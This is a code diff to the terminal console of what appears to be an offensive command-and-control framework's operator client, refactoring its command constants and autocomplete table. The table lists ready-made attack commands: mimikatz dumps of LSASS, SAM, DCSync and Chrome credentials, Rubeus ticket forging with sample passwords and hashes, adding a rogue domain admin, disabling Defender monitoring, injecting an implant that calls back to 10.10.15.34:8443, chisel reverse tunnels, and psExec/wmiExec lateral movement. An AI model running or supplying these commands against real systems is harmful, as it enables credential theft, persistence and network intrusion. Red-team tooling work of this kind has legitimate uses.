@@ -12,7 +12,258 @@ from TerminalPanel import *
 
 
 #
-# Consoles
+# Constant
+#
+TerminalTabTitle = "Terminal"
+CmdHistoryFileName = ".cmdHistory"
+
+HelpInstruction = "help"
+SleepInstruction = "sleep"
+EndInstruction = "end"
+ListenerInstruction = "listener"
+LoadModuleInstruction = "loadModule"
+SocksInstruction = "socks"
+
+AssemblyExecInstruction = "assemblyExec"
+UploadInstruction = "upload"
+RunInstruction = "run"
+DownloadInstruction = "download"
+InjectInstruction = "inject"
+ScriptInstruction = "script"
+PwdInstruction = "pwd"
+CdInstruction = "cd"
+LsInstruction = "ls"
+PsInstruction = "ps"
+CatInstruction = "cat"
+TreeInstruction = "tree"
+MakeTokenInstruction = "makeToken"
+Rev2selfInstruction = "rev2self"
+StealTokenInstruction = "stealToken"
+CoffLoaderInstruction = "coffLoader"
+UnloadModuleInstruction = "unloadModule"
+KerberosUseTicketInstruction = "kerberosUseTicket"
+PowershellInstruction = "powershell"
+ChiselInstruction = "chisel"
+PsExecInstruction = "psExec"
+WmiInstruction = "wmiExec"
+SpawnAsInstruction = "spawnAs"
+EvasionInstruction = "evasion"
+
+StartInstruction = "start"
+StopInstruction = "stop"
+
+completerData = [
+    (HelpInstruction,[]),
+    (SleepInstruction,[]),
+    (EndInstruction,[]),
+    (ListenerInstruction,[
+            (StartInstruction+' smb pipename',[]),
+            (StartInstruction+' tcp 127.0.0.1 4444',[]),
+            (StopInstruction,  []),
+             ]),
+    (AssemblyExecInstruction,[
+                        ('-e',[
+                            ('mimikatz.exe',[
+                                ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
+                                ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
+                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
+                                ('"sekurlsa::logonpasswords" "exit"',  []),
+                                ('"sekurlsa::ekeys" "exit"',  []),
+                                ('"lsadump::sam" "exit"',  []),
+                                ('"lsadump::cache" "exit"',  []),
+                                ('"lsadump::secrets" "exit"',  []),
+                                ('"dpapi::chrome /in:"""C:\\Users\\CyberVuln\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"""" "exit"', []),
+                                ('"dpapi::cred /in:C:\\Users\\joe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"', []),
+                                ('"sekurlsa::dpapi" "exit"',  []),
+                                ('"dpapi::masterkey /in:C:\\Users\\joe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-308422719-809814085-1049341588-1001/36bf2476-ed68-4bf9-9604-c84a6e8bcb03 /rpc" "exit"',  []),
+                            ]),
+                            
+                            ('SharpView.exe Get-DomainComputer',  []),
+                            ('Rubeus.exe',[
+                                ('triage',[]),
+                                ('purge',[]),
+                                ('asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
+                                ('s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
+                            ]),
+                            ('Seatbelt.exe',[
+                                ('-group=system',[]),
+                                ('-group=user',[]),
+                            ]),
+                            ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
+                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
+                        ]),
+                    ]),
+    (UploadInstruction,[]),
+    (RunInstruction,[
+             ('cmd /c',  []),
+             ('cmd /c sc query',  []),
+             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
+             ('cmd /c where /r c:\\ *.txt',  []),
+             ('cmd /c tasklist /SVC',  []),
+             ('cmd /c taskkill /pid 845 /f',  []),
+             ('cmd /c schtasks /query /fo LIST /v',  []),
+             ('cmd /c net user superadmin123 Password123!* /add',  []),
+             ('cmd /c net localgroup administrators superadmin123 /add',  []),
+             ('cmd /c net user superadmin123 Password123!* /add /domain',  []),
+             ('cmd /c net group "domain admins" superadmin123 /add /domain',  []),
+             ]),
+    (DownloadInstruction,[]),
+    (InjectInstruction,[
+                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
+                ('-e implant.exe -1',  []),
+    ]),
+    (ScriptInstruction,[]),
+    (PwdInstruction,[]),
+    (CdInstruction,[]),
+    (LsInstruction,[]),
+    (PsInstruction,[]),
+    (CatInstruction,[]),
+    (TreeInstruction,[]),
+    (MakeTokenInstruction,[]),
+    (Rev2selfInstruction,[]),
+    (StealTokenInstruction,[]),
+    (CoffLoaderInstruction,[
+        ('adcs_enum.x64.o', [('go',[])]),
+        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
+        ('adcs_enum_com2.x64.o', [('go',[])]),
+        ('adv_audit_policies.x64.o', [('go',[])]),
+        ('arp.x64.o', [('go',[])]),
+        ('cacls.x64.o', [('go zz hostname servicename',[])]),
+        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
+        ('driversigs.x64.o', [('go Zi name, 0',[])]),
+        ('enum_filter_driver.x64.o', [('go',[])]),
+        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
+        ('env.x64.o', [('go',[])]),
+        ('findLoadedModule.x64.o', [('go',[])]),
+        ('get-netsession.x64.o', [('go',[])]),
+        ('get_password_policy.x64.o', [('go Z server',[])]),
+        ('ipconfig.x64.o', [('go',[])]),
+        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
+        ('listdns.x64.o', [('go',[])]),
+        ('listmods.x64.o', [('go i pid',[])]),
+        ('locale.x64.o', [('go',[])]),
+        ('netgroup.x64.o', [('go sZZ type server group',[])]),
+        ('netlocalgroup.x64.o', [('go',[])]),
+        ('netshares.x64.o', [('go Zi name, 1',[])]),
+        ('netstat.x64.o', [('go',[])]),
+        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
+        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
+        ('netuserenum.x64.o', [('go',[])]),
+        ('netview.x64.o', [('go Z domain',[])]),
+        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
+        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
+        ('probe.x64.o', [('go zi host port',[])]),
+        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
+        ('resources.x64.o', [('go',[])]),
+        ('routeprint.x64.o', [('go',[])]),
+        ('sc_enum.x64.o', [('go',[])]),
+        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
+        ('schtasksquery.x64.o', [('go',[])]),
+        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
+        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
+        ('sc_qfailure.x64.o', [('go',[])]),
+        ('sc_qtriggerinfo.x64.o', [('go',[])]),
+        ('sc_query.x64.o', [('go',[])]),
+        ('tasklist.x64.o', [('go Z system',[])]),
+        ('uptime.x64.o', [('go',[])]),
+        ('vssenum.x64.o', [('go',[])]),
+        ('whoami.x64.o', [('go',[])]),
+        ('windowlist.x64.o', [('go',[])]),
+        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
+             ]),
+    (UnloadModuleInstruction,[
+             (AssemblyExecInstruction, []),
+             (CdInstruction, []),
+             (CoffLoaderInstruction, []),
+             (DownloadInstruction, []),
+             (InjectInstruction, []),
+             (LsInstruction, []),
+             (PsInstruction, []),
+             (MakeTokenInstruction, []),
+             (PwdInstruction, []),
+             (Rev2selfInstruction, []),
+             (RunInstruction, []),
+             (ScriptInstruction, []),
+             (StealTokenInstruction, []),
+             (UploadInstruction,  []),
+             (PowershellInstruction,  []),
+             (PsExecInstruction,  []),
+             (KerberosUseTicketInstruction,  []),
+             (ChiselInstruction,  []),
+             (EvasionInstruction,  []),
+             (SpawnAsInstruction,  []),
+             (WmiInstruction,  []),
+             ]),
+    (KerberosUseTicketInstruction,[]),
+    (PowershellInstruction,[
+                ('-i PowerView.ps1',  []),
+                ('Get-Domain',  []),
+                ('Get-DomainTrust',  []),
+                ('Get-DomainUser',  []),
+                ('Get-DomainComputer -Properties DnsHostName',  []),
+                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
+                ('-i PowerUp.ps1',  []),
+                ('Invoke-AllChecks',  []),
+                ('-i Powermad.ps1',  []),
+                ('-i PowerUpSQL.ps1',  []),
+                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
+                ]),
+    (ChiselInstruction,[
+                ('status',  []),
+                ('stop',  []),
+                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
+                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
+                ]),
+    (PsExecInstruction,[
+        ('10.10.10.10 implant.exe',  []),
+    ]),
+    (WmiInstruction,[
+        ('10.10.10.10 implant.exe',  []),
+    ]),
+    (SpawnAsInstruction,[
+        ('user password implant.exe',  []),
+    ]),
+    (SocksInstruction,[
+        ('start 1080',  []),
+        ('stop',  []),
+    ]),
+    (EvasionInstruction,[
+        ('CheckHooks',  []),
+        ('Unhook',  []),
+    ]),
+    (LoadModuleInstruction,[
+             ('AssemblyExec', []),
+             ('ChangeDirectory', []),
+             ('Coff', []),
+             ('Download', []),
+             ('Inject', []),
+             ('ListDirectory', []),
+             ('ListProcesses', []),
+             ('MakeToken', []),
+             ('PrintWorkingDirectory', []),
+             ('Rev2self', []),
+             ('Run', []),
+             ('Script', []),
+             ('StealToken', []),
+             ('Upload',  []),
+             ('Powershell',  []),
+             ('PsExec',  []),
+             ('KerberosUseTicket',  []),
+             ('Chisel',  []),
+             ('SpawnAs',  []),
+             ('Cat',  []),
+             ('Tree',  []),
+             ('Evasion',  []),
+             ('WmiExec',  []),
+             ]),
+]
+
+orangeText = '<p style=\"color:orange;white-space:pre\">[+] {} </p>'
+redText = '<p style=\"color:red;white-space:pre\">[+] {} </p>'
+
+
+#
+# Consoles Tab Implementation
 #
 class ConsolesTab(QWidget):
     
@@ -35,7 +286,7 @@ class ConsolesTab(QWidget):
         self.setLayout(self.layout)
 
         tab = QWidget()
-        self.tabs.addTab(tab, "Terminal")
+        self.tabs.addTab(tab, TerminalTabTitle)
         tab.layout = QVBoxLayout(self.tabs)
         terminal = Terminal(self, self.ip, self.port, self.devMode)
         tab.layout.addWidget(terminal)
@@ -138,7 +389,7 @@ class Console(QWidget):
             line = '\n';
             self.editorOutput.insertPlainText(line)
         else:
-            cmdHistoryFile = open('.cmdHistory', 'a')
+            cmdHistoryFile = open(CmdHistoryFileName, 'a')
             cmdHistoryFile.write(commandLine)
             cmdHistoryFile.write('\n')
             cmdHistoryFile.close()
@@ -150,17 +401,15 @@ class Console(QWidget):
 
             self.commandEditor.setCmdHistory()
             instructions = commandLine.split()
-            if instructions[0]=="help":
+            if instructions[0]==HelpInstruction:
                 command = TeamServerApi_pb2.Command(
                 cmd=commandLine)
                 response = self.grpcClient.getHelp(command)
-                line = '<p style=\"color:orange;white-space:pre\">[+] ' + response.cmd + '</p>'
-                self.editorOutput.appendHtml(line)
+                self.editorOutput.appendHtml(orangeText.format(response.cmd))
                 line = '\n' + response.response.decode(encoding="latin1", errors="ignore")  + '\n';
                 self.editorOutput.insertPlainText(line)
             else:
-                line = '<p style=\"color:orange;white-space:pre\">[+] send: \"' + commandLine + '\"</p>'
-                self.editorOutput.appendHtml(line)
+                self.editorOutput.appendHtml(orangeText.format(commandLine))
                 line = '\n';
                 self.editorOutput.insertPlainText(line)
                 command = TeamServerApi_pb2.Command(
@@ -178,8 +427,7 @@ class Console(QWidget):
         responses = self.grpcClient.getResponseFromSession(session)
         for response in responses:
             self.setCursorEditorAtEnd()
-            line = '<p style=\"color:red;white-space:pre\">[+] result: \"' + response.instruction + " " + response.cmd + '\"</p>'
-            self.editorOutput.appendHtml(line)
+            self.editorOutput.appendHtml(redText.format(response.instruction + " " + response.cmd))
             line = '\n' + response.response.decode(encoding="latin1", errors="ignore")  + '\n'
             self.editorOutput.insertPlainText(line)
             self.setCursorEditorAtEnd()
@@ -218,8 +466,8 @@ class CommandEditor(QLineEdit):
     def __init__(self, parent=None):
         super().__init__(parent)
 
-        if(os.path.isfile('.cmdHistory')):
-            cmdHistoryFile = open('.cmdHistory')
+        if(os.path.isfile(CmdHistoryFileName)):
+            cmdHistoryFile = open(CmdHistoryFileName)
             self.cmdHistory = cmdHistoryFile.readlines()
             self.idx=len(self.cmdHistory)-1
             cmdHistoryFile.close()
@@ -259,7 +507,7 @@ class CommandEditor(QLineEdit):
             self.setText(cmd.strip())
 
     def setCmdHistory(self):
-        cmdHistoryFile = open('.cmdHistory')
+        cmdHistoryFile = open(CmdHistoryFileName)
         self.cmdHistory = cmdHistoryFile.readlines()
         self.idx=len(self.cmdHistory)-1
         cmdHistoryFile.close()
@@ -270,212 +518,6 @@ class CommandEditor(QLineEdit):
     def onActivated(self):
         QTimer.singleShot(0, self.clear)
 
-
-completerData = [
-    ('help',[]),
-    ('sleep',[]),
-    ('end',[]),
-    ('listener',[
-            ('start smb pipename',[]),
-            ('start tcp 127.0.0.1 4444',[]),
-            ('stop',  []),
-             ]),
-    ('assemblyExec',[
-                        ('-e',[
-                            ('mimikatz.exe',[
-                                ('"!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "exit"',[]),
-                                ('"privilege::debug" "lsadump::dcsync /domain:m3c.local /user:krbtgt" "exit"',[]),
-                                ('"privilege::debug" "lsadump::lsa /inject /name:joe" "exit"',[]),
-                                ('"sekurlsa::logonpasswords" "exit"',  []),
-                                ('"sekurlsa::ekeys" "exit"',  []),
-                                ('"lsadump::sam" "exit"',  []),
-                                ('"lsadump::cache" "exit"',  []),
-                                ('"lsadump::secrets" "exit"',  []),
-                                ('"dpapi::chrome /in:"""C:\\Users\\CyberVuln\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"""" "exit"', []),
-                                ('"dpapi::cred /in:C:\\Users\\joe\\AppData\\Local\\Microsoft\\Credentials\\DFBE70A7E5CC19A398EBF1B96859CE5D" "exit"', []),
-                                ('"sekurlsa::dpapi" "exit"',  []),
-                                ('"dpapi::masterkey /in:C:\\Users\\joe\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-308422719-809814085-1049341588-1001/36bf2476-ed68-4bf9-9604-c84a6e8bcb03 /rpc" "exit"',  []),
-                            ]),
-                            
-                            ('SharpView.exe Get-DomainComputer',  []),
-                            ('Rubeus.exe',[
-                                ('triage',[]),
-                                ('purge',[]),
-                                ('asktgt /user:OFFSHORE_ADM /password:Banker!123 /domain:client.offshore.com /nowrap /ptt',  []),
-                                ('s4u /user:MS02$ /aes256:a7ef524856fbf9113682384b725292dec23e54ab4e66cfdca8dd292b1bb198ae /impersonateuser:administrator /msdsspn:cifs/dc04.client.OFFSHORE.COM /altservice:host /nowrap /ptt',  []),
-                            ]),
-                            ('Seatbelt.exe',[
-                                ('-group=system',[]),
-                                ('-group=user',[]),
-                            ]),
-                            ('SharpHound.exe -c All -d dev.admin.offshore.com',  []),
-                            ('SweetPotato.exe -e EfsRpc -p C:\\Users\\Public\\Documents\\implant.exe',  []),
-                        ]),
-                    ]),
-    ('upload',[]),
-    ('run',[
-             ('cmd /c',  []),
-             ('cmd /c sc query',  []),
-             ('cmd /c wmic service where caption="Serviio" get name, caption, state, startmode',  []),
-             ('cmd /c where /r c:\\ *.txt',  []),
-             ('cmd /c tasklist /SVC',  []),
-             ('cmd /c taskkill /pid 845 /f',  []),
-             ('cmd /c schtasks /query /fo LIST /v',  []),
-             ('cmd /c net user superadmin123 Password123!* /add',  []),
-             ('cmd /c net localgroup administrators superadmin123 /add',  []),
-             ('cmd /c net user superadmin123 Password123!* /add /domain',  []),
-             ('cmd /c net group "domain admins" superadmin123 /add /domain',  []),
-             ]),
-    ('download',[]),
-    ('inject',[
-                ('-e BeaconHttp.exe -1 10.10.15.34 8443 https',  []),
-                ('-e implant.exe -1',  []),
-    ]),
-    ('script',[]),
-    ('pwd',[]),
-    ('cd',[]),
-    ('ls',[]),
-    ('ps',[]),
-    ('cat',[]),
-    ('tree',[]),
-    ('makeToken',[]),
-    ('rev2self',[]),
-    ('stealToken',[]),
-    ('coffLoader',[
-        ('adcs_enum.x64.o', [('go',[])]),
-        ('adcs_enum_com.x64.o', [('go ZZ hostname sharename',[])]),
-        ('adcs_enum_com2.x64.o', [('go',[])]),
-        ('adv_audit_policies.x64.o', [('go',[])]),
-        ('arp.x64.o', [('go',[])]),
-        ('cacls.x64.o', [('go zz hostname servicename',[])]),
-        ('dir.x64.o', [('go Zs targetdir subdirs',[])]),
-        ('driversigs.x64.o', [('go Zi name, 0',[])]),
-        ('enum_filter_driver.x64.o', [('go',[])]),
-        ('enumlocalsessions.x64.o', [('go zz modname procname',[])]),
-        ('env.x64.o', [('go',[])]),
-        ('findLoadedModule.x64.o', [('go',[])]),
-        ('get-netsession.x64.o', [('go',[])]),
-        ('get_password_policy.x64.o', [('go Z server',[])]),
-        ('ipconfig.x64.o', [('go',[])]),
-        ('ldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
-        ('listdns.x64.o', [('go',[])]),
-        ('listmods.x64.o', [('go i pid',[])]),
-        ('locale.x64.o', [('go',[])]),
-        ('netgroup.x64.o', [('go sZZ type server group',[])]),
-        ('netlocalgroup.x64.o', [('go',[])]),
-        ('netshares.x64.o', [('go Zi name, 1',[])]),
-        ('netstat.x64.o', [('go',[])]),
-        ('netuse.x64.o', [('go sZZZZss 1 share user password device persist requireencrypt',[])]),
-        ('netuser.x64.o', [('go ZZ 2 domain',[])]),
-        ('netuserenum.x64.o', [('go',[])]),
-        ('netview.x64.o', [('go Z domain',[])]),
-        ('nonpagedldapsearch.x64.o', [('go zzizz 2 attributes result_limit hostname domain',[])]),
-        ('nslookup.x64.o', [('go zzs lookup server type',[])]),
-        ('probe.x64.o', [('go zi host port',[])]),
-        ('reg_query.x64.o', [('go zizzi hostname hive path key, 0',[])]),
-        ('resources.x64.o', [('go',[])]),
-        ('routeprint.x64.o', [('go',[])]),
-        ('sc_enum.x64.o', [('go',[])]),
-        ('schtasksenum.x64.o', [('go ZZ 2 3',[])]),
-        ('schtasksquery.x64.o', [('go',[])]),
-        ('sc_qc.x64.o', [('go zz hostname servicename',[])]),
-        ('sc_qdescription.x64.o', [('go zz hostname servicename',[])]),
-        ('sc_qfailure.x64.o', [('go',[])]),
-        ('sc_qtriggerinfo.x64.o', [('go',[])]),
-        ('sc_query.x64.o', [('go',[])]),
-        ('tasklist.x64.o', [('go Z system',[])]),
-        ('uptime.x64.o', [('go',[])]),
-        ('vssenum.x64.o', [('go',[])]),
-        ('whoami.x64.o', [('go',[])]),
-        ('windowlist.x64.o', [('go',[])]),
-        ('wmi_query.x64.o', [('go ZZZ system namespace query',[])]),
-             ]),
-    ('unloadModule',[
-             ('assemblyExec', []),
-             ('cd', []),
-             ('coff', []),
-             ('download', []),
-             ('inject', []),
-             ('ls', []),
-             ('ps', []),
-             ('makeToken', []),
-             ('pwd', []),
-             ('rev2self', []),
-             ('run', []),
-             ('script', []),
-             ('stealToken', []),
-             ('upload',  []),
-             ('powershell',  []),
-             ('psExec',  []),
-             ('kerberosUseTicket',  []),
-             ('chisel',  []),
-             ('evasion',  []),
-             ('spawnAs',  []),
-             ('wmiExec',  []),
-             ]),
-    ('kerberosUseTicket',[]),
-    ('powershell',[
-                ('-i PowerView.ps1',  []),
-                ('Get-Domain',  []),
-                ('Get-DomainTrust',  []),
-                ('Get-DomainUser',  []),
-                ('Get-DomainComputer -Properties DnsHostName',  []),
-                ('powershell Get-NetSession -ComputerName MS01 | select CName, UserName',  []),
-                ('-i PowerUp.ps1',  []),
-                ('Invoke-AllChecks',  []),
-                ('-i Powermad.ps1',  []),
-                ('-i PowerUpSQL.ps1',  []),
-                ('Set-MpPreference -DisableRealtimeMonitoring $true',  []),
-                ]),
-    ('chisel',[
-                ('status',  []),
-                ('stop',  []),
-                ('chisel.exe client 192.168.57.21:9001 R:socks',  []),
-                ('chisel.exe client 192.168.57.21:9001 R:445:192.168.57.14:445',  []),
-                ]),
-    ('psExec',[
-        ('10.10.10.10 implant.exe',  []),
-    ]),
-    ('wmiExec',[
-        ('10.10.10.10 implant.exe',  []),
-    ]),
-    ('spawnAs',[
-        ('user password implant.exe',  []),
-    ]),
-    ('socks',[
-        ('start 1080',  []),
-        ('stop',  []),
-    ]),
-    ('evasion',[
-        ('CheckHooks',  []),
-        ('Unhook',  []),
-    ]),
-    ('loadModule',[
-             ('AssemblyExec', []),
-             ('ChangeDirectory', []),
-             ('Coff', []),
-             ('Download', []),
-             ('Inject', []),
-             ('ListDirectory', []),
-             ('ListProcesses', []),
-             ('MakeToken', []),
-             ('PrintWorkingDirectory', []),
-             ('Rev2self', []),
-             ('Run', []),
-             ('Script', []),
-             ('StealToken', []),
-             ('Upload',  []),
-             ('Powershell',  []),
-             ('PsExec',  []),
-             ('KerberosUseTicket',  []),
-             ('Chisel',  []),
-             ('SpawnAs',  []),
-             ('Cat',  []),
-             ('Tree',  []),
-             ('Evasion',  []),
-             ('WmiExec',  []),
-             ]),
-]
 
 class CodeCompleter(QCompleter):
     ConcatenationRole = Qt.UserRole + 1
